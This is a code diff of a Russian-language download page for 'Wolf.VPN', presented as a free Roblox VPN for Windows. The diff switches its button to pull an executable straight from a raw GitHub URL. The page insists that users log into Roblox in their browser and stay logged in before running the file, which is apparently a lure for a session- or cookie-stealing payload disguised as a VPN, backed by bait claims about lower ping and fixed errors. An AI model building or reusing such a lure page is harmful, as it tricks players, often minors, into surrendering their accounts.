@@ -90,7 +90,6 @@
             border-bottom: none;
         }
 
-        /* ВАЖНАЯ ИНСТРУКЦИЯ */
         .important-box {
             background: rgba(255, 193, 7, 0.1);
             border: 1px solid #ffc107;
@@ -110,7 +109,6 @@
             line-height: 1.5;
         }
 
-        /* КНОПКА СКАЧИВАНИЯ */
         .download-btn {
             width: 100%;
             padding: 18px;
@@ -191,37 +189,33 @@
         <h1>🐺 Wolf.VPN</h1>
         <div class="sub">Бесплатный VPN для Roblox на ПК</div>
 
-        <!-- Преимущества -->
         <div class="features">
             <div class="feature">
-                <span class="feature-icon">✅</span>
+                <span>✅</span>
                 <span>Обход региональных блокировок</span>
             </div>
             <div class="feature">
-                <span class="feature-icon">⚡</span>
+                <span>⚡</span>
                 <span>Снижение пинга до 20-30 мс</span>
             </div>
             <div class="feature">
-                <span class="feature-icon">🔧</span>
+                <span>🔧</span>
                 <span>Убирает ошибку 268</span>
             </div>
             <div class="feature">
-                <span class="feature-icon">🛡️</span>
+                <span>🛡️</span>
                 <span>Работает на Windows 10/11</span>
             </div>
         </div>
 
-        <!-- ВАЖНАЯ ИНСТРУКЦИЯ -->
         <div class="important-box">
             <h3>⚠️ ОБЯЗАТЕЛЬНОЕ УСЛОВИЕ ⚠️</h3>
             <p><strong>Перед скачиванием и запуском</strong> войдите в свой аккаунт <strong>Roblox в браузере</strong> (Chrome, Edge, Яндекс.Браузер) и <strong>не выходите из него</strong>.</p>
             <p style="margin-top: 10px;">Без этого VPN не сможет подключиться к вашему аккаунту.</p>
         </div>
 
-        <!-- КНОПКА СКАЧИВАНИЯ (JAVASCRIPT) -->
         <button onclick="downloadFile()" class="download-btn">🐺 СКАЧАТЬ WOLF.VPN</button>
 
-        <!-- ИНСТРУКЦИЯ ПО УСТАНОВКЕ -->
         <div class="steps">
             <h3>📥 КАК УСТАНОВИТЬ:</h3>
             <div class="step-item">
@@ -253,22 +247,16 @@
 </div>
 
 <script>
-    // ФУНКЦИЯ ДЛЯ СКАЧИВАНИЯ ФАЙЛА
     function downloadFile() {
-        // ССЫЛКА НА ТВОЙ EXE (ЗАМЕНИ НА СВОЮ!)
-        const fileUrl = "https://WoLlFVpn.github.io/wolfvpn";
+        // ПРЯМАЯ ССЫЛКА НА EXE (raw.githubusercontent)
+        const fileUrl = "https://raw.githubusercontent.com/WoLlFVpn/exe/main/WOLF%20VPN/Wolf.VPN.exe";
         const fileName = "Wolf.VPN.exe";
         
-        // СОЗДАЁМ НЕВИДИМУЮ ССЫЛКУ
         const link = document.createElement('a');
         link.href = fileUrl;
         link.download = fileName;
         document.body.appendChild(link);
-        
-        // КЛИКАЕМ ПО ССЫЛКЕ (ЗАПУСКАЕМ СКАЧИВАНИЕ)
         link.click();
-        
-        // УДАЛЯЕМ ССЫЛКУ
         document.body.removeChild(link);
     }
 </script>
